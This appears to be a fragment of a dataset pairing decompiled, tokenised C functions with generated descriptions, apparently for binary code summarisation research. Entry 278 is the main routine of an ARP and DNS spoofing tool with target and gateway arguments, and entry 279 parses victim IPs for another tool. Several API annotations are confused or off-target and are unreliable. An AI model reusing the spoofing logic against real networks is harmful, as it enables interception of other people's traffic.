            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is likely intended to read a quadword (64 bits) from the FS segment register and is often used for accessing thread-local storage or other per-thread data structures in x86-64 assembly programming.",
            "The function `check_dns_domain` appears to be a part of a network packet inspection program, parsing DNS requests and constructing DNS responses with hardcoded IP addresses, possibly for DNS spoofing or redirection purposes.",
            "The function \"readfsqword\" is used to read the quadword (64-bit) value from the segment specified by the FS register in x86 architecture."
        ],
        "longer_label": "The provided code appears to be a function, `handleframe`, likely involved in network packet inspection, utilizing the `__readfsqword` function to access thread-local storage, parsing DNS requests in the `check_dns_domain` function, and potentially generating DNS responses with hardcoded IP addresses, possibly for DNS spoofing or redirection purposes."
    },
    {
        "id": 278,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "if",
            "the",
            "number",
            "of",
            "command",
            "line",
            "arguments",
            "is",
            "not",
            "equal",
            "to",
            "6",
            "and",
            "prints",
            "usage",
            "information",
            "if",
            "not",
            ",",
            "then",
            "sets",
            "up",
            "and",
            "starts",
            "ARP",
            "spoofing",
            "on",
            "the",
            "specified",
            "domain",
            "and",
            "interface",
            ",",
            "creates",
            "a",
            "pthread",
            "to",
            "handle",
            "ARP",
            "spoofing",
            ",",
            "sets",
            "up",
            "a",
            "socket",
            "for",
            "capturing",
            "network",
            "packets",
            ",",
            "and",
            "continuously",
            "receives",
            "and",
            "processes",
            "incoming",
            "packets",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "uint16_t",
            "v4",
            ";",
            "__int16",
            "v5",
            ";",
            "socklen_t",
            "addr_len",
            ";",
            "pthread_t",
            "newthread",
            ";",
            "void",
            "*",
            "arg",
            ";",
            "void",
            "*",
            "s",
            ";",
            "ssize_t",
            "v10",
            ";",
            "struct",
            "sockaddr",
            "addr",
            ";",
            "unsigned",
            "__int64",
            "v12",
            ";",
            "v12",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "argc",
            "=",
            "=",
            "6",
            ")",
            "{",
            "strncpy",
            "(",
            "interface",
            ",",
            "argv",
            "[",
            "1",
            "]",
            ",",
            "0x10uL",
            "L",
            ")",
            ";",
            "strncpy",
            "(",
            "domain",
            ",",
            "argv",
            "[",
            "2",
            "]",
            ",",
            "0x3CuL",
            "L",
            ")",
            ";",
            "strncpy",
            "(",
            "dummy_ip",
            ",",
            "argv",
            "[",
            "3",
            "]",
            ",",
            "0x10uL",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"spoofing domain %s on interface %s\\n\"",
            ",",
            "domain",
            ",",
            "interface",
            ")",
            ";",
            "printf",
            "(",
            "\"starting arpspoofing %s\\n\"",
            ",",
            "argv",
            "[",
            "4",
            "]",
            ")",
            ";",
            "puts",
            "(",
            "\"x\"",
            ")",
            ";",
            "arg",
            "=",
            "malloc",
            "(",
            "8uL",
            "L",
            ")",
            ";",
            "puts",
            "(",
            "\"x\"",
            ")",
            ";",
            "puts",
            "(",
            "\"x\"",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "arg",
            "=",
            "argv",
            "[",
            "4",
            "]",
            ";",
            "puts",
            "(",
            "\"x\"",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "arg",
            "+",
            "1",
            ")",
            "=",
            "argv",
            "[",
            "5",
            "]",
            ";",
            "puts",
            "(",
            "\"params\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "pthread_create",
            "(",
            "&",
            "newthread",
            ",",
            "0L",
            "L",
            ",",
            "(",
            "void",
            "*",
            "(",
            "*",
            ")",
            "(",
            "void",
            "*",
            ")",
            ")",
            "arp_spoof",
            ",",
            "arg",
            ")",
            ")",
            "{",
            "atexit",
            "(",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "void",
            "*",
            ")",
            ")",
            "cleanup",
            ")",
            ";",
            "signal",
            "(",
            "2",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "stop",
            ")",
            ";",
            "v4",
            "=",
            "htons",
            "(",
            "3u",
            ")",
            ";",
            "sfd",
            "=",
            "socket",
            "(",
            "17",
            ",",
            "3",
            ",",
            "v4",
            ")",
            ";",
            "setsockopt",
            "(",
            "sfd",
            ",",
            "1",
            ",",
            "26",
            ",",
            "&",
            "bpf",
            ",",
            "0x10u",
            ")",
            ";",
            "strncpy",
            "(",
            "ifr",
            ",",
            "interface",
            ",",
            "0x10uL",
            "L",
            ")",
            ";",
            "ioctl",
            "(",
            "sfd",
            ",",
            "0x8913uL",
            "L",
            ",",
            "ifr",
            ")",
            ";",
            "LOBYTE",
            "(",
            "v5",
            ")",
            "=",
            "word_6270",
            ";",
            "HIBYTE",
            "(",
            "v5",
            ")",
            "=",
            "HIBYTE",
            "(",
            "word_6270",
            ")",
            "|",
            "1",
            ";",
            "word_6270",
            "=",
            "v5",
            ";",
            "ioctl",
            "(",
            "sfd",
            ",",
            "0x8914uL",
            "L",
            ",",
            "ifr",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "s",
            "=",
            "malloc",
            "(",
            "0x5EAuL",
            "L",
            ")",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "0x5EAuL",
            "L",
            ")",
            ";",
            "memset",
            "(",
            "&",
            "addr",
            ",",
            "0",
            ",",
            "0x14uL",
            "L",
            ")",
            ";",
            "addr_len",
            "=",
            "20",
            ";",
            "v10",
            "=",
            "recvfrom",
            "(",
            "sfd",
            ",",
            "s",
            ",",
            "0x5EAuL",
            "L",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "&",
            "addr_len",
            ")",
            ";",
            "handleframe",
            "(",
            "(",
            "__int64",
            ")",
            "s",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v10",
            ",",
            "(",
            "__int64",
            ")",
            "&",
            "addr",
            ")",
            ";",
            "free",
            "(",
            "s",
            ")",
            ";",
            "}",
            "}",
            "fwrite",
            "(",
            "\"arp thread create error\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x17uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"./dnsspoof <interface> <domain_to_spoof> <ip_to_spoof> <target_ip> <gateway_ip>\"",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"__read\" function seems to be used in different contexts across the provided code snippets, including handling device reads, file system I/O, and potentially interacting with shared library symbols, suggesting it serves as a versatile utility function for reading data from various sources within a software system.",
            "The `strncpy` function is used to copy at most `n` characters from the source string to the destination string, ensuring null termination, typically used for safer string copying to prevent buffer overflow vulnerabilities.",
            "The `printf` function in this context appears to be a modified version used for formatting output, potentially with additional functionality for handling special cases like infinity and NaN, and it's part of a larger codebase including an RPN calculator and system-specific definitions.",
            "The `malloc` function in the provided code snippets is a custom implementation that allocates memory using the `GlobalAlloc` function with zero initialization, likely intended for a Windows environment, and is utilized in conjunction with various algorithms and data structures such as binary search, permutation generation, tree construction, and arithmetic operations on arrays.",
            "The function `thread_create` is designed to create a new thread, handling platform-specific differences between Linux and non-Linux environments, using pthreads on Linux and GLib's thread creation functions otherwise, facilitating multithreading in network-related operations."
        ],
        "longer_label": "The provided code is a C program that implements ARP spoofing and DNS spoofing functionalities, utilizing low-level socket programming and multithreading, with annotations highlighting the usage of specific functions like \"__read\" for versatile data reading, \"strncpy\" for safer string copying, and a modified version of \"printf\" for formatted output within a larger codebase including an RPN calculator and system-specific definitions."
    },
    {
        "id": 279,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "main",
            "function",
            "with",
            "command",
            "line",
            "options",
            "to",
            "specify",
            "host",
            "and",
            "victim",
            "IP",
            "and",
            "port",
            ",",
            "then",
            "allocates",
            "memory",
            "for",
            "client",
            ",",
            "host",
            ",",
            "and",
            "victim",
            ",",
            "processes",
            "the",
            "input",
            ",",
            "and",
            "returns",
            "success",
            "or",
            "failure",
            "status",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "int",
            "v4",
            ";",
            "const",
            "char",
            "*",
            "s",
            "[",
            "2",
            "]",
            ";",
            "const",
            "char",
            "*",
            "v6",
            "[",
            "2",
            "]",
            ";",
            "int",
            "v7",
            "[",
            "8",
            "]",
            ";",
            "struct",
            "option",
            "longopts",
            ";",
            "const",
            "char",
            "*",
            "v9",
            ";",
            "int",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "const",
            "char",
            "*",
            "v13",
            ";",
            "int",
            "v14",
            ";",
            "__int64",
            "v15",
            ";",
            "int",
            "v16",
            ";",
            "const",
            "char",
            "*",
            "v17",
            ";",
            "int",
            "v18",
            ";",
            "__int64",
            "v19",
            ";",
            "int",
            "v20",
            ";",
            "const",
            "char",
            "*",
            "v21",
            ";",
            "int",
            "v22",
            ";",
            "__int64",
            "v23",
            ";",
            "int",
            "v24",
            ";",
            "unsigned",
            "__int64",
            "v25",
            ";",
            "v25",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "longopts",
            ".",
            "name",
            "=",
            "\"help\"",
            ";",
            "longopts",
            ".",
            "has_arg",
            "=",
            "0",
            ";",
            "longopts",
            ".",
            "flag",
            "=",
            "0L",
            "L",
            ";",
            "longopts",
            ".",
            "val",
            "=",
            "104",
            ";",
            "v9",
            "=",
            "\"hostip\"",
            ";",
            "v10",
            "=",
            "1",
            ";",
            "v11",
            "=",
            "0L",
            "L",
            ";",
            "v12",
            "=",
            "105",
            ";",
            "v13",
            "=",
            "\"hostport\"",
            ";",
            "v14",
            "=",
            "1",
            ";",
            "v15",
            "=",
            "0L",
            "L",
            ";",
            "v16",
            "=",
            "112",
            ";",
            "v17",
            "=",
            "\"victimip\"",
            ";",
            "v18",
            "=",
            "1",
            ";",
            "v19",
            "=",
            "0L",
            "L",
            ";",
            "v20",
            "=",
            "106",
            ";",
            "v21",
            "=",
            "\"victimport\"",
            ";",
            "v22",
            "=",
            "1",
            ";",
            "v23",
            "=",
            "0L",
            "L",
            ";",
            "v24",
            "=",
            "107",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "s",
            ")",
            ")",
            ";",
            "memset",
            "(",
            "v6",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "v6",
            ")",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v4",
            "=",
            "getopt_long",
            "(",
            "argc",
            ",",
            "(",
            "char",
            "*",
            "const",
            "*",
            ")",
            "argv",
            ",",
            "\"hi:p:j:k:\"",
            ",",
            "&",
            "longopts",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "63",
            ")",
            "{",
            "fwrite",
            "(",
            "\"Ignoring unknown option. Try --help\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x24uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "v4",
            ">",
            "=",
            "63",
            "&",
            "&",
            "v4",
            "<",
            "=",
            "112",
            "&",
            "&",
            "v4",
            ">",
            "=",
            "104",
            "&",
            "&",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v4",
            "-",
            "104",
            ")",
            "<",
            "=",
            "8",
            ")",
            "{",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "}",
            "}",
            "if",
            "(",
            "s",
            "[",
            "0",
            "]",
            "&",
            "&",
            "s",
            "[",
            "1",
            "]",
            "&",
            "&",
            "v6",
            "[",
            "0",
            "]",
            "&",
            "&",
            "v6",
            "[",
            "1",
            "]",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "myrkur_alloc",
            "(",
            "v7",
            ",",
            "s",
            ",",
            "v6",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "return",
            "-",
            "1",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "myrkur_main",
            "(",
            "(",
            "__int64",
            ")",
            "v7",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "return",
            "-",
            "1",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "myrkur_free",
            "(",
            "(",
            "__int64",
            ")",
            "v7",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "return",
            "-",
            "1",
            ";",
            "}",
            "else",
            "{",
            "return",
            "0",
            ";",
            "}",
            "}",
            "else",
            "{",
            "myrkur_help",
            "(",
            "\"myrkur\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a C program utilizing getopt_long for command-line argument parsing, with options for help, host IP, host port, victim IP, and victim port, and includes function calls for allocation, main processing, and deallocation based on the parsed arguments."
    },
    {
        "id": 280,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "prints",
            "usage",
            "information",
            "for",
            "a",
            "program",
            "with",
            "specified",
            "options",
            "and",
            "their",
            "corresponding",
            "help",
            "messages",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "progname",
            ")",
            "{",
            "int",
            "i",
            ";",
            "i",
            "=",
            "0",
            ";",
            "puts",
            "(",
            "\"\\nUsage:\\n endhost OPTIONS\\n\"",
            ")",
            ";",
            "while",
            "(",
            "long_options",
            "[",
            "i",
            "]",
            ".",
            "name",
            ")",
            "{",
            "printf",
            "(",
            "\" -%c, --%-13s %s\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "long_options",
            "[",
            "i",
            "]",
            ".",
            "val",
            ",",
            "long_options",
            "[",
            "i",
            "]",
            ".",
            "name",
            ",",
            "options_help",
            "[",
            "i",
            "]",
            ")",
            ";",
            "+",
            "+",
            "i",
            ";",
            "}",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function is being redefined and used in the provided code snippets to customize output formatting and possibly extend its functionality within a larger program, such as a modified RPN calculator or other computational tasks, while the last code snippet demonstrates a basic usage of the function to print \"Hello World\" to the console."
        ],
        "longer_label": "The provided code snippet defines a function `endhost_print_usage` to display usage options for a program, utilizing `printf` to format the output, particularly iterating through a list of options and their descriptions."
    },
    {
        "id": 281,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "a",
            "router",
            "file",
            ",",
            "counts",
            "the",
            "number",
            "of",
            "routers",
            "specified",
            ",",
            "allocates",
            "memory",
            "for",
            "the",
            "routers",
            ",",
            "parses",
            "the",
            "router",
            "addresses",
            ",",
            "and",
            "logs",
            "the",
            "router",
            "information",
            "before",
            "closing",
            "the",
            "file",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "endhost_input_t",
            "*",
            "input",
            ")",
            "{",
            "endhost_router_t",
            "*",
            "routers",
            ";",
            "int",
            "v3",
            ";",
            "in_addr",
            "addr",
            ";",
            "int",
            "idx",
            ";",
            "int",
            "rc",
            ";",
            "FILE",
            "*",
            "fp",
            ";",
            "char",
            "line",
            "[",
            "256",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v9",
            ";",
            "v9",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "line",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "line",
            ")",
            ")",
            ";",
            "idx",
            "=",
            "0",
            ";",
            "fp",
            "=",
            "fopen",
            "(",
            "input",
            "-",
            ">",
            "router_file",
            ",",
            "\"r\"",
            ")",
            ";",
            "if",
            "(",
            "fp",
            ")",
            "{",
            "while",
            "(",
            "fgets",
            "(",
            "line",
            ",",
            "256",
            ",",
            "fp",
            ")",
            ")",
            "+",
            "+",
            "input",
            "-",
            ">",
            "num_routers",
            ";",
            "if",
            "(",
            "input",
            "-",
            ">",
            "num_routers",
            ")",
            "{",
            "input",
            "-",
            ">",
            "routers",
            "=",
            "(",
            "endhost_router_t",
            "*",
            ")",
            "calloc",
            "(",
            "input",
            "-",
            ">",
            "num_routers",
            ",",
            "8uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "input",
            "-",
            ">",
            "routers",
            ")",
            "{",
            "rewind",
            "(",
            "fp",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "if",
            "(",
            "!",
            "fgets",
            "(",
            "line",
            ",",
            "256",
            ",",
            "fp",
            ")",
            ")",
            "{",
            "fclose",
            "(",
            "fp",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "line",
            "[",
            "(",
            "unsigned",
            "__int8",
            ")",
            "strlen",
            "(",
            "line",
            ")",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "rc",
            "=",
            "inet_pton",
            "(",
            "2",
            ",",
            "line",
            ",",
            "&",
            "addr",
            ")",
            ";",
            "if",
            "(",
            "rc",
            "<",
            "=",
            "0",
            ")",
            "break",
            ";",
            "routers",
            "=",
            "input",
            "-",
            ">",
            "routers",
            ";",
            "v3",
            "=",
            "idx",
            "+",
            "+",
            ";",
            "routers",
            "[",
            "v3",
            "]",
            ".",
            "router_addr",
            "=",
            "addr",
            ".",
            "s_addr",
            ";",
            "}",
            "if",
            "(",
            "rc",
            ")",
            "perror",
            "(",
            "\"Error parsing router address. Reason\"",
            ")",
            ";",
            "else",
            "printf",
            "(",
            "\"%s not in presentation format\\n\"",
            ",",
            "line",
            ")",
            ";",
            "fclose",
            "(",
            "fp",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error allocating memory. Reason\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"No routers specified in router file\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error opening router file. Reason\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"qword\" likely handles operations related to 64-bit quantities (quad words) in a programming context, potentially involving manipulation, storage, or processing of large numerical data."
        ],
        "longer_label": "The provided code appears to be a C function `endhost_read_router_file` which reads router information from a file, parses the addresses, allocates memory for storing the addresses, and handles potential errors related to file operations, memory allocation, and address parsing, with annotations suggesting the presence of operations related to 64-bit quantities."
    },
    {
        "id": 282,
        "docstring_tokens": [
            "The",
            "function",
            "reads",
            "input",
            "options",
            "from",
            "command",
            "line",
            "arguments",
            "and",
            "sets",
            "values",
            "in",
            "an",
            "endhost_input_t",
            "struct",
            ",",
            "checking",
            "for",
            "valid",
            "options",
            "and",
            "displaying",
            "usage",
            "information",
            "if",
            "necessary",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "endhost_input_t",
            "*",
            "input",
            ",",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "int",
            "argc",
            ")",
            "{",
            "int",
            "opt_idx",
            ";",
            "int",
            "opt",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "opt_idx",
            "=",
            "0",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "opt",
            "=",
            "getopt_long",
            "(",
            "argc",
            ",",
            "argv",
            ",",
            "\"hr:s:t:u:\"",
            ",",
            "long_options",
            ",",
            "&",
            "opt_idx",
            ")",
            ";",
            "if",
            "(",
            "opt",
            "=",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "if",
            "(",
            "opt",
            "!",
            "=",
            "63",
            ")",
            "{",
            "if",
            "(",
            "opt",
            ">",
            "=",
            "63",
            "&",
            "&",
            "opt",
            "<",
            "=",
            "117",
            "&",
            "&",
            "opt",
            ">",
            "=",
            "104",
            "&",
            "&",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "opt",
            "-",
            "104",
            ")",
            "<",
            "=",
            "0xD",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "abort",
            "(",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "!",
            "input",
            "-",
            ">",
            "router_file",
            "[",
            "0",
            "]",
            "|",
            "|",
            "!",
            "input",
            "-",
            ">",
            "tcp_port",
            "|",
            "|",
            "!",
            "input",
            "-",
            ">",
            "udp_port",
            "|",
            "|",
            "!",
            "input",
            "-",
            ">",
            "stop_threshold",
            ")",
            "{",
            "puts",
            "(",
            "\"Please speicify all options\"",
            ")",
            ";",
            "endhost_print_usage",
            "(",
            "*",
            "argv",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "opt",
            "=",
            "endhost_read_router_file",
            "(",
            "input",
            ")",
            ";",
            "if",
            "(",
            "opt",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "puts",
            "(",
            "\"Error reading router file\"",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` appears to be used to read a 64-bit value from the FS segment register, commonly employed in low-level programming for accessing thread-local storage or other processor-specific data structures in protected mode.",
            "The function `_print_usage` is commonly used across different programs to display usage instructions or command-line options to the user."
        ],
        "longer_label": "The provided code is a C function `endhost_read_input` which reads input parameters, checks for specific options using `getopt_long`, accesses thread-local storage using `__readfsqword`, and prints usage instructions if required options are not provided, with an error message if there's an issue reading a router file."
    },
    {
        "id": 283,
        "docstring_tokens": [
            "The",
            "code",
            "creates",
            "a",
            "socket",
            "with",
            "specified",
            "address",
            ",",
            "port",
            ",",
            "and",
            "receive",
            "TTL",
            "settings",
            ",",
            "and",
            "binds",
            "it",
            "to",
            "the",
            "local",
            "address",
            "and",
            "port",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "uint32_t",
            "addr",
            ",",
            "uint16_t",
            "port",
            ",",
            "uint8_t",
            "recv_ttl",
            ")",
            "{",
            "int",
            "yes",
            ";",
            "int",
            "ttl",
            ";",
            "int",
            "rc",
            ";",
            "int",
            "sockfd",
            ";",
            "sockaddr_in",
            "lcladdr",
            ";",
            "unsigned",
            "__int64",
            "v10",
            ";",
            "v10",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "rc",
            "=",
            "0",
            ";",
            "sockfd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "2",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "sockfd",
            ">",
            "=",
            "0",
            ")",
            "{",
            "rc",
            "=",
            "setsockopt",
            "(",
            "sockfd",
            ",",
            "1",
            ",",
            "2",
            ",",
            "&",
            "yes",
            ",",
            "4u",
            ")",
            ";",
            "if",
            "(",
            "rc",
            ">",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "recv_ttl",
            "&",
            "&",
            "(",
            "(",
            "ttl",
            "=",
            "64",
            ",",
            "rc",
            "=",
            "setsockopt",
            "(",
            "sockfd",
            ",",
            "0",
            ",",
            "12",
            ",",
            "&",
            "ttl",
            ",",
            "4u",
            ")",
            ",",
            "rc",
            "<",
            "0",
            ")",
            "|",
            "|",
            "(",
            "rc",
            "=",
            "setsockopt",
            "(",
            "sockfd",
            ",",
            "0",
            ",",
            "8",
            ",",
            "&",
            "yes",
            ",",
            "4u",
            ")",
            ",",
            "rc",
            "<",
            "0",
            ")",
            ")",
            ")",
            "{",
            "perror",
            "(",
            "\"Error setting IP_RECVTTL. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "else",
            "{",
            "memset",
            "(",
            "&",
            "lcladdr",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "lcladdr",
            ")",
            ")",
            ";",
            "lcladdr",
            ".",
            "sin_family",
            "=",
            "2",
            ";",
            "lcladdr",
            ".",
            "sin_port",
            "=",
            "htons",
            "(",
            "port",
            ")",
            ";",
            "lcladdr",
            ".",
            "sin_addr",
            ".",
            "s_addr",
            "=",
            "htonl",
            "(",
            "addr",
            ")",
            ";",
            "rc",
            "=",
            "bind",
            "(",
            "sockfd",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "lcladdr",
            ",",
            "0x10u",
            ")",
            ";",
            "if",
            "(",
            "rc",
            ">",
            "=",
            "0",
            ")",
            "{",
            "return",
            "sockfd",
            ";",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error binding addr-port. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "}",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error setting SO_REUSEADDR. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error creating socket. Reason\"",
            ")",
            ";",
            "return",
            "sockfd",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "Based on the function name \"qword\" and the absence of code snippets, it appears that the function is intended to perform some operation related to quadwords (64-bit integers) but lacks implementation details, possibly serving as a placeholder for future development.",
            "The function `setsock` appears to configure various socket options, including making the socket non-blocking, enabling reuse of local addresses, potentially binding to a specific network interface, and handling multicast socket setup, while handling error conditions gracefully.",
            "The function `memset` is being defined and implemented with various optimizations and alternate implementations to provide memory setting functionality, including zeroing out memory blocks, likely to enhance performance and compatibility in different contexts and platforms.",
            "The function \"htons\" likely converts a 16-bit integer from host byte order to network byte order (big-endian), essential for network communication protocols like TCP/IP."
        ],
        "longer_label": "The provided code defines a function intended to create a socket with specific options, handle various socket setup configurations, and gracefully handle errors, while including placeholders for future development and optimizing memory setting functionality for performance and compatibility."
    },
    {
        "id": 284,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "sends",
            "a",
            "control",
            "signal",
            "to",
            "a",
            "router",
            "at",
            "a",
            "specified",
            "IP",
            "address",
            "and",
            "port",
            "number",
            "using",
            "a",
            "TCP",
            "socket",
            ",",
            "logging",
            "the",
            "action",
            "and",
            "handling",
            "errors",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "uint32_t",
            "addr",
            ",",
            "uint16_t",
            "port",
            ")",
            "{",
            "int",
            "*",
            "v3",
            ";",
            "char",
            "*",
            "v4",
            ";",
            "const",
            "char",
            "*",
            "v5",
            ";",
            "const",
            "char",
            "*",
            "v6",
            ";",
            "double",
            "v7",
            ";",
            "in_addr",
            "saddr",
            ";",
            "int",
            "sockfd",
            ";",
            "int",
            "rc",
            ";",
            "sockaddr_in",
            "srvaddr",
            ";",
            "char",
            "buf",
            "[",
            "16",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v13",
            ";",
            "v13",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "saddr",
            ".",
            "s_addr",
            "=",
            "addr",
            ";",
            "sockfd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "sockfd",
            ">",
            "=",
            "0",
            ")",
            "{",
            "memset",
            "(",
            "&",
            "srvaddr",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "srvaddr",
            ")",
            ")",
            ";",
            "srvaddr",
            ".",
            "sin_family",
            "=",
            "2",
            ";",
            "srvaddr",
            ".",
            "sin_port",
            "=",
            "htons",
            "(",
            "port",
            ")",
            ";",
            "srvaddr",
            ".",
            "sin_addr",
            ".",
            "s_addr",
            "=",
            "addr",
            ";",
            "rc",
            "=",
            "connect",
            "(",
            "sockfd",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "srvaddr",
            ",",
            "0x10u",
            ")",
            ";",
            "if",
            "(",
            "rc",
            ">",
            "=",
            "0",
            ")",
            "{",
            "rc",
            "=",
            "send",
            "(",
            "sockfd",
            ",",
            "\"DDOS detected\"",
            ",",
            "0xDuL",
            "L",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "rc",
            ">",
            "=",
            "0",
            ")",
            "{",
            "v6",
            "=",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "saddr",
            ",",
            "buf",
            ",",
            "0x10u",
            ")",
            ";",
            "v7",
            "=",
            "_time",
            "(",
            ")",
            ";",
            "fprintf",
            "(",
            "input",
            ".",
            "loghdl",
            ",",
            "\"%.6f  startMarking  %s  %s\\n\"",
            ",",
            "v7",
            ",",
            "v6",
            ",",
            "\"DDOS detected\"",
            ")",
            ";",
            "close",
            "(",
